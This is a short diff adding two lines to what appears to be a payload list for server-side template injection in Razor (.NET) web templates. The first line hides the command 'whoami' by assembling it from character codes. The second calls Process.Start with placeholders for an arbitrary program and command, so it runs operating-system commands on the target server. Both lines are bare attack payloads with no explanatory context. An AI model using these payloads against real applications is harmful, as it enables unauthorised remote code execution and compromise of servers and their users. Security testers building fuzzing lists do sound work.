@@ -1,0 +1,2 @@
+@{string x=null;int[]l={119,104,111,97,109,105};foreach(int c in l){x+=((char)c).ToString();};}@x
+@System.Diagnostics.Process.Start(_PROGRAM_,_COMMAND_);
